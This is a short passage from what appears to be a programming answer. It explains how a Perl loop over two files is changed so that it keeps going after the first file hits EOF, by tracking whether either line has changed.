One complication is that the `while ($pair1 and $pair2)` test will cause the loop to finish as soon as either one of the files reaches EOF.

So I modified `read_file_line` to return either the next line or the current line, and I keep a pair of booleans to check if the pair-line has changed. Instead of testing for EOF, I test if both lines have been unchanged by running `read_file_line`. If so, then I can safely exit the `while` loop."
